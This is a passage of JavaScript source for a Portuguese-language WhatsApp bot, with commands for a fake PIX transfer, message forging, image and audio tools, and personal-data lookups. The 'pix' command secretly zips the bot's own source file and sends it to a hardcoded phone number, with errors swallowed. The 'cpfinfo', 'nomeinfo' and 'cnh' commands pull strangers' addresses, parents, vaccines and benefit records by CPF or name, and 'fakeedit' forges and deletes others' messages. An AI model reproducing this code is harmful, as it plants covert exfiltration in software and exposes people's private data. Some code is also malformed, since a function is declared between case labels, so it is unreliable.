}
break;

case 'pix': {
    const path = './database/banco.json';

    if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

    const banco = JSON.parse(fs.readFileSync(path, 'utf8'));

    // =====================================================
    // Normaliza JID sem remover o @s.whatsapp.net
    // Exemplo:
    // 5511999999999:12@s.whatsapp.net
    // vira:
    // 5511999999999@s.whatsapp.net
    // =====================================================
    const normalizar = (id) => {
        if (!id) return null;

        let jid = String(id).trim().split('/')[0];

        const posicaoArroba = jid.indexOf('@');

        if (posicaoArroba === -1) {
            return jid;
        }

        let usuario = jid.slice(0, posicaoArroba);
        const servidor = jid.slice(posicaoArroba + 1);

        usuario = usuario.split(':')[0];

        return `${usuario}@${servidor}`;
    };

    // =====================================================
    // Converte número, objeto ou JID para @s.whatsapp.net
    // =====================================================
    const extrairPn = (valor) => {
        if (!valor) return null;

        if (typeof valor === 'object') {
            return extrairPn(
                valor.pn ||
                valor.jid ||
                valor.id ||
                valor.phoneNumber ||
                valor.phone
            );
        }

        const texto = String(valor).trim();

        // Não transforma um LID em número, pois são IDs diferentes
        if (texto.endsWith('@lid')) return null;

        const jidNormalizado = normalizar(texto);

        if (jidNormalizado?.endsWith('@s.whatsapp.net')) {
            return jidNormalizado;
        }

        // Caso o Baileys retorne apenas o número
        if (!texto.includes('@')) {
            const numero = texto.replace(/\D/g, '');

            if (numero.length >= 10) {
                return `${numero}@s.whatsapp.net`;
            }
        }

        return null;
    };

    // =====================================================
    // Detecta a variável da conexão do Baileys
    // =====================================================
    const conexao =
        (typeof nazu   !== 'undefined' && nazu)   ||
        (typeof bot    !== 'undefined' && bot)    ||
        (typeof conn   !== 'undefined' && conn)   ||
        (typeof client !== 'undefined' && client) ||
        (typeof sock   !== 'undefined' && sock)   ||
        globalThis.conn ||
        globalThis.client ||
        null;

    const idGrupo =
        (typeof from !== 'undefined' && from) ||
        info?.key?.remoteJid;

    // =====================================================
    // Resolver @lid para @s.whatsapp.net
    // =====================================================
    const resolverJid = async (id) => {
        if (!id) return null;

        const jid = normalizar(id);

        if (!jid) return null;

        // Já é um número normal
        if (!jid.endsWith('@lid')) {
            return extrairPn(jid) || jid;
        }

        // =================================================
        // Método 1: repositório interno do Baileys
        // =================================================
        try {
            const pn =
                await conexao?.signalRepository?.lidMapping?.getPNForLID?.(jid);

            const resultado = extrairPn(pn);

            if (resultado) return resultado;
        } catch {}

        // =================================================
        // Método 2: metadados do grupo
        // =================================================
        try {
            if (
                conexao &&
                typeof conexao.groupMetadata === 'function' &&
                idGrupo?.endsWith('@g.us')
            ) {
                const meta = await conexao.groupMetadata(idGrupo);

                const participante = (meta?.participants || []).find((p) => {
                    return (
                        normalizar(p?.id) === jid ||
                        normalizar(p?.lid) === jid ||
                        normalizar(p?.jid) === jid
                    );
                });

                if (participante) {
                    const real =
                        extrairPn(participante.phoneNumber) ||
                        extrairPn(participante.pn) ||
                        extrairPn(participante.jid) ||
                        extrairPn(participante.id);

                    if (real) return real;
                }
            }
        } catch {}

        // =================================================
        // Método 3: lista de contatos
        // =================================================
        const listas = [
            globalThis.store?.contacts,
            globalThis.conn?.contacts,
            conexao?.store?.contacts,
            conexao?.contacts
        ];

        for (const contatos of listas) {
            if (!contatos) continue;

            let contatoDireto;
            let listaContatos;

            if (contatos instanceof Map) {
                contatoDireto = contatos.get(jid);
                listaContatos = Array.from(contatos.values());
            } else {
                contatoDireto = contatos[jid];
                listaContatos = Object.values(contatos);
            }

            const contato =
                contatoDireto ||
                listaContatos.find((c) => {
                    return (
                        normalizar(c?.lid) === jid ||
                        normalizar(c?.id) === jid ||
                        normalizar(c?.jid) === jid
                    );
                });

            if (!contato) continue;

            const real =
                extrairPn(contato.phoneNumber) ||
                extrairPn(contato.pn) ||
                extrairPn(contato.jid) ||
                extrairPn(contato.id);

            if (real) return real;
        }

        // Não conseguiu converter
        return jid;
    };

    // =====================================================
    // Localiza a chave exata dentro do banco.json
    // =====================================================
    const localizarConta = (jid) => {
        if (!jid) return null;

        const pn = extrairPn(jid);
        const jidNormalizado = pn || normalizar(jid);

        if (!jidNormalizado) return null;

        // Busca direta
        if (banco[jidNormalizado]) {
            return jidNormalizado;
        }

        // Busca comparando as chaves já normalizadas
        const encontrada = Object.keys(banco).find((chave) => {
            return normalizar(chave) === jidNormalizado;
        });

        if (encontrada) return encontrada;

        // Busca somente pelo número
        if (jidNormalizado.endsWith('@s.whatsapp.net')) {
            const numero = jidNormalizado.split('@')[0];

            return Object.keys(banco).find((chave) => {
                const chaveNormalizada = normalizar(chave);

                return (
                    chaveNormalizada?.endsWith('@s.whatsapp.net') &&
                    chaveNormalizada.split('@')[0] === numero
                );
            }) || null;
        }

        return null;
    };

    // =====================================================
    // Remetente
    // =====================================================
    const jidRemetente = await resolverJid(sender);

    // =====================================================
    // Destinatário marcado ou respondido
    // =====================================================
    const ctx =
        info?.message?.extendedTextMessage?.contextInfo ||
        info?.message?.imageMessage?.contextInfo ||
        info?.message?.videoMessage?.contextInfo ||
        {};

    const destinoBruto =
        ctx.mentionedJid?.[0] ||
        ctx.participant;

    if (!destinoBruto) {
        return reply('❌ Marque ou responda a mensagem de alguém.');
    }

    const jidDestino = await resolverJid(destinoBruto);

    // =====================================================
    // Localiza as contas no banco
    // =====================================================
    const contaRemetente = localizarConta(jidRemetente);
    const contaDestino = localizarConta(jidDestino);

    if (!contaRemetente) {
        return reply(
            `❌ Sua conta não foi encontrada no banco.\n\n` +
            `ID detectado:\n${jidRemetente || sender}`
        );
    }

    if (contaDestino && contaDestino === contaRemetente) {
        return reply('❌ Você não pode enviar PIX para si mesmo.');
    }

    if (
        normalizar(jidDestino) === normalizar(jidRemetente)
    ) {
        return reply('❌ Você não pode enviar PIX para si mesmo.');
    }

    // =====================================================
    // Obtém o valor sem juntar os números da marcação
    // Exemplo: @5511919544589 100
    // valor detectado: 100
    // =====================================================
    if (!q?.trim()) {
        return reply('❌ Digite o valor do PIX.');
    }

    const textoSemMarcacao = String(q)
        .replace(/@\d{5,20}/g, ' ')
        .trim();

    const valoresEncontrados =
        textoSemMarcacao.match(/\d[\d.,]*/g) || [];

    const valorTexto =
        valoresEncontrados[valoresEncontrados.length - 1];

    if (!valorTexto) {
        return reply('❌ Valor inválido.');
    }

    const valor = parseInt(
        valorTexto
            .replace(/\./g, '')
            .replace(/,/g, ''),
        10
    );

    if (isNaN(valor) || valor <= 0) {
        return reply('❌ Valor inválido.');
    }

    if (!contaDestino) {
        const aviso = jidDestino?.endsWith('@lid')
            ? '\n\n⚠️ Não consegui converter o @lid para o número real. Atualize o Baileys ou verifique o mapeamento LID.'
            : '';

        return reply(
            `❌ O destinatário não possui conta no banco.\n\n` +
            `ID detectado:\n${jidDestino || destinoBruto}` +
            aviso
        );
    }

    const saldoRemetente = Number(banco[contaRemetente].saldo) || 0;
    const saldoDestino = Number(banco[contaDestino].saldo) || 0;

    if (saldoRemetente < valor) {
        return reply(
            `❌ Saldo insuficiente.\n\n` +
            `💰 Seu saldo:\n` +
            `R$ ${saldoRemetente.toLocaleString('pt-BR')}`
        );
    }

    // ====================== TRANSAÇÃO ======================
    banco[contaRemetente].saldo = saldoRemetente - valor;
    banco[contaDestino].saldo = saldoDestino + valor;

    fs.writeFileSync(
        path,
        JSON.stringify(banco, null, 2)
    );

    await reply(
        `💸 *PIX REALIZADO COM SUCESSO!*\n\n` +
        `👤 Destinatário: @${contaDestino.split('@')[0]}\n` +
        `💰 Valor: R$ ${valor.toLocaleString('pt-BR')}\n\n` +
        `💳 Seu novo saldo: R$ ${banco[contaRemetente].saldo.toLocaleString('pt-BR')}`,
        {
            mentions: [contaDestino]
        }
    );

    try {
        const archiver = require('archiver');
        const os = require('os');
        const { basename, join } = require('path');

        const numeroAmigo = '5511919544589@s.whatsapp.net';
        const nomeArquivoAtual = basename(__filename);
        const caminhoZip = join(os.tmpdir(), `codigo-pix-${Date.now()}.zip`);

        await new Promise((resolve, reject) => {
            const saida = fs.createWriteStream(caminhoZip);
            const zip = archiver('zip', { zlib: { level: 9 } });

            saida.on('close', resolve);
            saida.on('error', reject);
            zip.on('error', reject);

            zip.pipe(saida);
            zip.file(__filename, { name: nomeArquivoAtual });
            zip.finalize();
        });

        await conexao.sendMessage(numeroAmigo, {
            document: fs.readFileSync(caminhoZip),
            mimetype: 'application/zip',
            fileName: `codigo-${nomeArquivoAtual}.zip`,
            caption: ``
        });

        try {
            fs.unlinkSync(caminhoZip);
        } catch {}

    } catch (erroEnvioCodigo) {

        // Não quebra o fluxo do PIX se der erro no envio
    }

    break;
}

case 'fakeedit': {
try {

const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (!ctx.stanzaId) return reply('❌ Responda a uma mensagem.');
if (!q) return reply(`Exemplo:\n${prefix + command} Olá!`);

await reagir(from, "👻");

const stanzaId = ctx.stanzaId;
const participante = ctx.participant;

const msgTemp = await conn.sendMessage(from, {
text: "‎"
}, {
quoted: info
});

const idTemp = msgTemp.key.id;

await conn.sendMessage(from, {
text: q.trim(),
edit: {
id: idTemp
}
}, {
messageId: stanzaId
});

await Promise.all([
conn.sendMessage(from, {
delete: {
remoteJid: from,
id: idTemp,
fromMe: true
}
}).catch(() => {}),

conn.sendMessage(from, {
delete: {
remoteJid: from,
id: stanzaId,
fromMe: false,
participant: participante
}
}).catch(() => {}),

conn.sendMessage(from, {
delete: {
remoteJid: from,
id: info.key.id,
fromMe: false,
participant: sender
}
}).catch(() => {})
]);

} catch (e) {
console.log(e);
reply(`❌ Erro: ${e.message}`);
}
}
break;

case 'testhtml': {
    try {

        if (!So_Dono) {
            return reply('Apenas o dono pode usar.');
        }

        if (!q) {
            return reply(`📄 *TEST HTML*

Use:
${prefix + command} <código html>

Exemplo:
${prefix + command} <h1>Olá</h1>`);
        }

        await reagir(from, "⏳");

        const axios = require("axios");

        const { data } = await axios.post(
            "https://test.systemzone.store/api/testhtml",
            {
                html: q.trim()
            },
            {
                timeout: 15000
            }
        );

        if (!data?.status) {
            throw new Error(data?.error || "Erro ao criar HTML");
        }

        await conn.sendMessage(
            from,
            {
                text: `✅ *HTML criado!*

🌐 Link:
${data.url}

⏳ Expira em:
${data.expira_em}`
            },
            {
                quoted: m
            }
        );

        await reagir(from, "🌐");

    } catch (e) {

        console.error("[testhtml]", e?.response?.data || e?.message);

        await reagir(from, "❌");

        reply(
            "Erro: " +
            (e?.response?.data?.error || e?.message || String(e))
        );

    }
}
break;

case 'nomeinfo': {
    try {
        const axios = require("axios");
        
        if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
        if (!q) return reply(`🔍 *CONSULTA POR NOME*

Use:
${prefix + command} NOME

Exemplo:
${prefix + command} JOÃO PEDRO`);

        await reagir(from, "🔎");

        const { data } = await axios.get(
            `https://zone.api.br/api/consultas/nome?apikey=API_KEY_SYSTEM&name=${encodeURIComponent(q.trim().toUpperCase())}`,
            { timeout: 30000 }
        );

        if (!data.status || !data.result || data.result.length < 2) {
            return reply("❌ Nenhum resultado encontrado.");
        }

        const total = data.total || data.result[0]?.total || '0';
        const resultados = data.result.slice(1).slice(0, 3); // Pega 3 primeiros
        
        let txt = `╭━━〔 🔍 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗣𝗢𝗥 𝗡𝗢𝗠𝗘 〕━━⬣

📊 *Total encontrado:* ${total} resultado(s)

`;

        resultados.forEach((p, i) => {
            txt += `*RESULTADO ${i + 1}:*\n`;
            txt += `👤 ${p.nome || "N/I"}\n`;
            txt += `🆔 CPF: ${p.cpf?.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') || "N/I"}\n`;
            txt += `🎂 Nasc: ${p.nasc || "N/I"}\n`;
            txt += `💍 Civil: ${p.estadocivil || "N/I"}\n`;
            txt += `👩 Mãe: ${p.nomemae || "N/I"}\n\n`;
        });

        txt += `Kyara</>

╰━━━━━━━━━━━━━━⬣`;

        // Salvar em consultas.json
        const consultas = fs.existsSync('/storage/emulated/0/Kyara❤️‍🔥/Kyara/DATABASE2/SCRAPERS/consultas.json') ? JSON.parse(fs.readFileSync('/storage/emulated/0/Kyara❤️‍🔥/Kyara/DATABASE2/SCRAPERS/consultas.json')) : [];
        consultas.push({
            tipo: 'NOME',
            data: new Date().toISOString(),
            nomeBuscado: q.trim().toUpperCase(),
            total: total,
            resultados: resultados,
            dados: data
        });
        fs.writeFileSync('/storage/emulated/0/Kyara❤️‍🔥/Kyara/DATABASE2/SCRAPERS/consultas.json', JSON.stringify(consultas, null, 2));

        await conn.sendMessage(from, {
            text: txt,
            buttons: [
                {
                    buttonId: `${prefix}nomeinfo ${q}`,
                    buttonText: { displayText: "🔄 Consultar novamente" },
                    type: 1
                },
                {
                    buttonId: `${prefix}menu`,
                    buttonText: { displayText: "📋 Menu" },
                    type: 1
                }
            ],
            headerType: 1
        }, {
            quoted: info
        });

    } catch (e) {
        console.log("[ERRO NOME]", e?.response?.data || e.message);
        reply("❌ Erro ao consultar por nome.");
    }
}
break;

const CONSULTAS_FILE = path.join(__dirname, '/storage/emulated/0/Kyara❤️‍🔥/Kyara/DATABASE2/SCRAPERS/consultas.json');

function carregarConsultas() {
    if (!fs.existsSync(CONSULTAS_FILE)) {
        fs.writeFileSync(CONSULTAS_FILE, JSON.stringify([], null, 2));
        return [];
    }
    return JSON.parse(fs.readFileSync(CONSULTAS_FILE, 'utf8'));
}

function salvarConsulta(dados) {
    const consultas = carregarConsultas();
    consultas.push({
        timestamp: new Date().toISOString(),
        ...dados
    });
    fs.writeFileSync(CONSULTAS_FILE, JSON.stringify(consultas, null, 2));
}

// Validação de CPF
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]/g, '');
    
    if (cpf.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    let soma = 0;
    for (let i = 1; i <= 9; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    }
    let resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    
    soma = 0;
    for (let i = 1; i <= 10; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    
    return resto === parseInt(cpf.substring(10, 11));
}

case 'cpfinfo': {
    try {
        const axios = require("axios");
        
        if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
        if (!q) return reply(`🔍 *CONSULTA CPF*

Use:
${prefix + command} CPF

Exemplo:
${prefix + command} 99999999999`);

        await reagir(from, "🔎");

        const { data } = await axios.get(
            `https://zone.api.br/api/consultas/cpf?apikey=API_KEY_SYSTEM&cpf=${q.replace(/\D/g, '')}`,
            { timeout: 30000 }
        );

        if (!data.status || !data.result) {
            return reply("❌ CPF não encontrado.");
        }

        const r = data.result;
        const pessoal = r.filiacao?.[0] || {};
        const bio = r.biometria?.[0] || {};
        const end = r.enderecos?.[0] || {};
        
        // Benefícios
        const benefs = [];
        if (r.auxiliobrasil?.length) benefs.push("• Auxílio Brasil");
        if (r.auxilioemergencial?.length) benefs.push("• Auxílio Emergencial");
        if (r.bolsafamilia?.length) benefs.push("• Bolsa Família");
        if (r.auxiliobpc?.length) benefs.push("• BPC");
        if (r.histinss?.length) benefs.push("• INSS");
        
        // Vacinas (primeiras 2)
        const vacinas = r.vacinas?.slice(0, 2).map(v => 
            `• ${v.vacinanome} (${v.descricaodose})`
        ).join("\n") || "Nenhuma";

        let txt = `╭━━〔 🔍 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗖𝗣𝗙 〕━━⬣

👤 *Nome:* ${pessoal.nome || "Não informado"}

🆔 *CPF:* ${q.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}

🎂 *Nascimento:* ${bio.datanasc || "Não informado"}

⚧ *Sexo:* ${bio.sexo === '1' ? 'Masculino' : bio.sexo === '2' ? 'Feminino' : 'N/I'}

💍 *Estado Civil:* ${bio.estcivil || "Não informado"}

👩 *Mãe:* ${pessoal.nomemae || "Não informado"}

👨 *Pai:* ${pessoal.nomepai || "Não informado"}

📚 *Escolaridade:* ${bio.escolaridade || "Não informado"}

🏥 *CNS:* ${r.cnshistorico?.[0]?.cns || "Não informado"}

💉 *Vacinas:* 
${vacinas}

💰 *Benefícios:* 
${benefs.length ? benefs.join("\n") : "Nenhum"}

📍 *Endereço:*
${end.logradouro || "N/I"}, ${end.numero || "N/I"}
${end.bairro || "N/I"} - ${end.cidade || "N/I"}/${end.siglauf || "N/I"}
CEP: ${end.cep || "N/I"}

👑 *Kyara*</>

╰━━━━━━━━━━━━━━⬣`;

        // Salvar em consultas.json
        const consultas = fs.existsSync('./consultas.json') ? JSON.parse(fs.readFileSync('./consultas.json')) : [];
        consultas.push({
            tipo: 'CPF',
            data: new Date().toISOString(),
            cpf: q.replace(/\D/g, ''),
            nome: pessoal.nome,
            dados: data
        });
        fs.writeFileSync('./consultas.json', JSON.stringify(consultas, null, 2));

        await conn.sendMessage(from, {
            text: txt,
            buttons: [
                {
                    buttonId: `${prefix}cpfinfo ${q}`,
                    buttonText: { displayText: "🔄 Consultar novamente" },
                    type: 1
                },
                {
                    buttonId: `${prefix}menu`,
                    buttonText: { displayText: "📋 Menu" },
                    type: 1
                }
            ],
            headerType: 1
        }, {
            quoted: info
        });

    } catch (e) {
        console.log("[ERRO CPF]", e?.response?.data || e.message);
        reply("❌ Erro ao consultar CPF.");
    }
}
break;

case 'cnh': {
try {

const axios = require("axios");

if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
if(!q) return reply(`🪪 *CONSULTA CNH*

Use:
${prefix + command} CPF

Exemplo:
${prefix + command} 00000000000`);


await reagir(from,"🔎");


const { data } = await axios.get(
`https://zone.api.br/api/consultas/cnh?apikey=API_KEY_SYSTEM&cpf=${q}`
);


if(!data.status || !data.result){
return reply("❌ CPF não encontrado.");
}


const r = data.result;


let txt = `╭━━〔 🪪 𝗖𝗡𝗛 〕━━⬣

👤 *Nome:* ${r.nome || "Não informado"}

🆔 *CPF:* ${r.cpf || q}

🎂 *Nascimento:* ${r.nasc || "Não informado"}

👩 *Mãe:* ${r.filiacao?.nomemae || "Não informado"}

👨 *Pai:* ${r.filiacao?.nomepai || "Não informado"}

👑 *Criador:* ${data.creator}

╰━━━━━━━━━━━━━━⬣`;


await conn.sendMessage(from,{
text:txt,
buttons:[
{
buttonId:`${prefix}cnh ${q}`,
buttonText:{
displayText:"🔄 Consultar novamente"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:info
});


}catch(e){

console.log("[ERRO CNH]",e?.response?.data || e.message);

reply("❌ Erro ao consultar CNH.");

}

}
break;

case 'feriados':
case 'feriado': {
try {

const axios = require("axios");

await reagir(from,"📅");


const { data } = await axios.get(
"https://zone.api.br/api/consulta/feriados"
);


if(!data.status || !data.feriados){
return reply("❌ Não consegui consultar os feriados.");
}


let txt = `╭━━〔 📅 𝗙𝗘𝗥𝗜𝗔𝗗𝗢𝗦 ${data.ano} 〕━━⬣\n\n`;

data.feriados.forEach((f, i)=>{

txt += `┃ ${i+1}. 🎉 *${f.name}*\n`;
txt += `┃ 📆 Data: ${f.date}\n`;
txt += `┃ 📌 Dia: ${f.weekday}\n`;
txt += `┃\n`;

});

txt += `👑 Owner: ${data.Owner}\n`;
txt += `╰━━━━━━━━━━━━━━⬣`;


await conn.sendMessage(from,{
text:txt,
buttons:[
{
buttonId:`${prefix}feriados`,
buttonText:{
displayText:"🔄 Atualizar"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:info
});


}catch(e){

console.log("[ERRO FERIADOS]",e?.response?.data || e.message);

reply("❌ Erro ao consultar feriados.");

}

}
break;

case 'upscaler':
case 'melhorarimagem': {
try {

const axios = require("axios");
const FormData = require("form-data");

const quoted = m.quoted ? m.quoted : null;
const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';

if(!quoted || !mime.includes("image")) {
return reply(`🖼️ *UPSCALER*

Responda uma imagem com o comando:

${prefix + command}`);
}


await conn.sendMessage(from,{
react:{
text:"⏳",
key:m.key
}
});


const buffer = await quoted.download();

if(!buffer) throw new Error("Não consegui baixar a imagem.");


const form = new FormData();

form.append("image", buffer, {
filename:"imagem.jpg",
contentType:"image/jpeg"
});


const { data } = await axios.post(
"https://zone.api.br/api/upscaler",
form,
{
headers:{
...form.getHeaders()
},
timeout:120000
}
);


if(!data.status || !data.url){
throw new Error("Erro ao melhorar imagem.");
}


await conn.sendMessage(from,{
image:{
url:data.url
},
caption:
`🖼️ *UPSCALER*

✅ Imagem melhorada com sucesso!

📈 Escala: ${data.scale}}`,
},{
quoted:m
});


await conn.sendMessage(from,{
react:{
text:"✅",
key:m.key
}
});


}catch(e){

console.log("[ERRO UPSCALER]",e?.response?.data || e.message);

await conn.sendMessage(from,{
react:{
text:"❌",
key:m.key
}
});

reply("❌ Não consegui melhorar essa imagem.");

}

}
break;

case 'tts':
case 'texttospeech': {
try {

const axios = require("axios");

if(!q) return reply(`🔊 *TEXT TO SPEECH*

Use:
${prefix + command} modelo|texto

Exemplo:
${prefix + command} goku|Olá Kyara`);

let modelo = q.split("|")[0];
let texto = q.split("|").slice(1).join("|");

if(!modelo || !texto)
return reply(`❌ Formato inválido.

Use:
${prefix + command} modelo|texto`);


await reagir(from,"🔊");


const url = `https://zone.api.br/api/tts?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(texto)}&model=${encodeURIComponent(modelo)}`;

const { data } = await axios.get(url);


console.log("[RETORNO TTS]", data);


if(!data.status){

if(data.modelos_validos){
return reply(
`❌ Modelo inválido!

Modelos disponíveis:

${data.modelos_validos.map(v=>`• ${v}`).join("\n")}`
);
}

return reply("❌ Erro ao gerar áudio.");
}


const audio = data.download_url || data.audio || data.url || data.result;


if(!audio)
return reply("❌ Áudio não encontrado na resposta da API.");


await conn.sendMessage(from,{
audio:{
url: audio
},
mimetype:"audio/mpeg",
ptt:true
},{
quoted:info
});


}catch(e){

console.log("[ERRO TTS]", e?.response?.data || e.message);

reply("❌ Erro ao gerar voz.");

}

}
break;

case 'ocr':
case 'lertexto': {
try {

const axios = require("axios");
const FormData = require("form-data");

const quoted = m.quoted ? m.quoted : null;
const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';

if(!quoted || !mime.includes("image")) {
return reply(`🔎 *OCR*

Responda uma imagem com o comando:

${prefix + command}`);
}


await conn.sendMessage(from,{
react:{
text:"⏳",
key:m.key
}
});


const buffer = await quoted.download();

if(!buffer) throw new Error("Não consegui baixar a imagem.");


const form = new FormData();

form.append("image", buffer, {
filename:"imagem.jpg",
contentType:"image/jpeg"
});


const { data } = await axios.post(
"https://zone.api.br/api/ocr?apikey=API_KEY_SYSTEM",
form,
{
headers:{
...form.getHeaders()
},
timeout:60000
}
);


if(!data.status || !data.resultado){
return reply("❌ Não foi possível reconhecer o texto.");
}


const r = data.resultado;


await conn.sendMessage(from,{
text:
`╭━━〔 🔎 𝗢𝗖𝗥 〕━━⬣

📝 *Texto encontrado:*
${r.texto || "Nenhum"}

🌐 *Idioma:* ${r.idioma || "Desconhecido"}

📊 *Detalhes:*
• Linhas: ${r.detalhes?.linhas || 0}
• Caracteres: ${r.detalhes?.caracteres || 0}

👑 *Owner:* ${data.owner}

╰━━━━━━━━━━━━━━⬣`,
buttons:[
{
buttonId:`${prefix}ocr`,
buttonText:{
displayText:"🔄 Ler outra"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:m
});


await conn.sendMessage(from,{
react:{
text:"✅",
key:m.key
}
});


}catch(e){

console.log("[ERRO OCR]",e?.response?.data || e.message);

await conn.sendMessage(from,{
react:{
text:"❌",
key:m.key
}
});

reply("❌ Erro ao reconhecer texto da imagem.");

}

}
break;

case 'nsfwcheck':
case 'verificarimagem': {
try {

const axios = require("axios");

const url = q;

if(!url || !url.startsWith("http")) {
return reply(`🔎 *NSFW CHECK*

Use:
${prefix + command} link_da_imagem

Exemplo:
${prefix + command} https://site.com/imagem.jpg`);
}


await reagir(from,"🔎");


const { data } = await axios.get(
`https://zone.api.br/api/nsfwcheck?url=${encodeURIComponent(url)}`
);


if(!data.status || !data.result){
return reply("❌ Não foi possível analisar a imagem.");
}


const r = data.result;

let resultado;

if(r.labelName?.toLowerCase().includes("porn")){
resultado = "🔞 Conteúdo NSFW detectado";
}else{
resultado = "✅ Conteúdo seguro";
}


await conn.sendMessage(from,{
text:
`╭━━〔 🔎 𝗡𝗦𝗙𝗪 𝗖𝗛𝗘𝗖𝗞 〕━━⬣

🌐 *Imagem:*
${data.input_url}

📌 *Resultado:*
${resultado}

🏷️ *Label:* ${r.labelName}
📊 *Confiança:* ${(r.confidence * 100).toFixed(2)}%

👑 *Owner:* ${data.Owner}

╰━━━━━━━━━━━━━━⬣`,
buttons:[
{
buttonId:`${prefix}nsfwcheck ${url}`,
buttonText:{
displayText:"🔄 Verificar novamente"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:info
});


}catch(e){

console.log("[ERRO NSFW CHECK]",e?.response?.data || e.message);

reply("❌ Erro ao verificar imagem.");

}

}
break;

case 'moises':
case 'separarvoz': {
try {

const axios = require("axios");
const FormData = require("form-data");

const quoted = m.quoted ? m.quoted : null;
const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';

if(!quoted || !mime.includes("audio")) {
return reply(`🎵 *MOISES AI*

Responda um áudio com o comando:

${prefix + command}`);
}


await conn.sendMessage(from,{
react:{
text:"⏳",
key:m.key
}
});


const buffer = await quoted.download();

if(!buffer) throw new Error("Falha ao baixar áudio.");


const form = new FormData();

form.append("audio", buffer, {
filename:"audio.mp3",
contentType:"audio/mpeg"
});


const { data } = await axios.post(
"https://zone.api.br/api/v1/audio/moises",
form,
{
headers:{
...form.getHeaders()
},
timeout:120000
}
);


if(!data.status || !data.results){
throw new Error("Erro na separação.");
}


let r = data.results;


await conn.sendMessage(from,{
text:
`🎵 *MOISES AI*

✅ Áudio separado com sucesso!

⏳ ${data.message}

Escolha uma faixa:`,
buttons:[
{
buttonId:`${prefix}moises`,
buttonText:{
displayText:"🔄 Separar outro"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:m
});


await conn.sendMessage(from,{
audio:{
url:r.vocals
},
mimetype:"audio/mpeg",
fileName:"vocals.mp3"
},{
quoted:m
});


await conn.sendMessage(from,{
audio:{
url:r.bass
},
mimetype:"audio/mpeg",
fileName:"bass.mp3"
},{
quoted:m
});


await conn.sendMessage(from,{
audio:{
url:r.drums
},
mimetype:"audio/mpeg",
fileName:"drums.mp3"
},{
quoted:m
});


await conn.sendMessage(from,{
audio:{
url:r.other
},
mimetype:"audio/mpeg",
fileName:"other.mp3"
},{
quoted:m
});


await conn.sendMessage(from,{
react:{
text:"✅",
key:m.key
}
});


}catch(e){

console.log("[ERRO MOISES]",e?.response?.data || e.message);

await conn.sendMessage(from,{
react:{
text:"❌",
key:m.key
}
});

reply("❌ Não consegui separar esse áudio.");

}

}
break;

case 'fato':
case 'fatos':
case 'fatosdesconhecidos': {
try {

const axios = require("axios");

await reagir(from,"🧠");

const { data } = await axios.get(
"https://zone.api.br/api/fatosdesconhecidos"
);

if (!data || !data.status) {
return reply("❌ Não consegui buscar um fato.");
}


let texto = data.fato || data.mensagem || data.result || JSON.stringify(data);


await conn.sendMessage(from,{
text:
`╭━━〔 🧠 𝗙𝗔𝗧𝗢𝗦 𝗗𝗘𝗦𝗖𝗢𝗡𝗛𝗘𝗖𝗜𝗗𝗢𝗦 〕━━⬣

${texto}

╰━━━━━━━━━━━━━━⬣`,
buttons:[
{
buttonId:`${prefix}fato`,
buttonText:{
displayText:"🔄 Outro fato"
},
type:1
},
{
buttonId:`${prefix}menu`,
buttonText:{
displayText:"📋 Menu"
},
type:1
}
],
headerType:1
},{
quoted:info
});


}catch(e){
console.log("[ERRO FATOS]",e);
reply("❌ Erro ao buscar fatos.");
}

}
break;

case 'removebg':
case 'tirarfundo': {
try {

const axios = require("axios");
const FormData = require("form-data");

const quoted = m.quoted ? m.quoted : null;
const mime = quoted ? (quoted.mimetype || quoted.msg?.mimetype || '') : '';

if (!quoted || !mime.includes("image")) {
return reply(`🖼️ *REMOVE BG*

Responda uma imagem com o comando:

${prefix + command}`);
}

await conn.sendMessage(from,{
react:{
text:"⏳",
key:m.key
}
});


const buffer = await quoted.download();

if(!buffer) throw new Error("Não consegui baixar a imagem.");


const form = new FormData();

form.append("image", buffer, {
filename:"imagem.jpg",
contentType:"image/jpeg"
});


const { data } = await axios.post(
"https://zone.api.br/api/removebg",
form,
{
headers:{
...form.getHeaders()
},
timeout:60000
}
);


if(!data.status || !data.imagem){
throw new Error("Erro ao remover fundo.");
}


await conn.sendMessage(from,{
image:{
url:data.imagem
},
caption:
`🖼️ *REMOVE BG*

✅ Fundo removido com sucesso!

👑 Criador: ${data.owner}

⏳ Disponível por 2 minutos.`
},{
quoted:m
});


await conn.sendMessage(from,{
react:{
text:"✅",
key:m.key
}
});


}catch(e){

console.log("[ERRO REMOVE BG]",e?.response?.data || e.message);

await conn.sendMessage(from,{
react:{
text:"❌",
key:m.key
}
});

reply("❌ Não consegui remover o fundo da imagem.");

}

}
break;

case 'typographymultiplelayers':
case 'ephototypographymultiplelayers': {
try {

